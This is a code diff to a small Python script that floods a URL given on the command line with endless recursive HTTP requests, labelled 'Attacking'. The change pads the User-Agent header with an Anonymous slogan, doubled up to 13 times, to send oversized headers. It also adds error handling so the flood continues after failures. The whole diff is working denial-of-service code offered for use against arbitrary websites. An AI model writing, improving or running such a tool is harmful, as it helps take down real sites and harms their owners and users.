@@ -34,12 +34,27 @@ from urllib.request import Request
 # Pass URL and keep requesting it
 ############################################################################################################################
 URL = str(sys.argv[1])
+print(str(sys.argv))
+UAStr = 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.'
+useBadRequest = str(sys.argv[2]) if len(sys.argv) == 3 else 'false'
+if useBadRequest == 'true':
+	# Bad Request : Below loop is for HTTP Code 400
+	for _ in list(range(13)):
+		UAStr += UAStr
+else:
+	# Good Request : Below loop is for HTTP Code 200
+	for _ in list(range(6)):
+		UAStr += UAStr
 counter = 0
 print('\n____________________________________________________\n\n', 'Attacking ->', URL, '\n____________________________________________________\n')
 def attack(counter):
-	counter += 1
-	req = Request(URL, headers={'User-Agent': 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.'})
-	title = BeautifulSoup(urllib.request.urlopen(req).read(), 'html.parser').find('title')
-	print('Attack', counter, '->', title.text, '\n')
-	attack(counter)
+	try:
+		counter += 1
+		req = Request(URL, headers={'User-Agent': UAStr + str(counter)})
+		title = BeautifulSoup(urllib.request.urlopen(req).read(), 'html.parser').find('title')
+		print('Attack', counter, '->', title.text, '\n')
+		attack(counter)
+	except Exception as ex:
+		print('Attack', counter, '->', ex, '\n')
+		attack(counter)
 attack(counter)
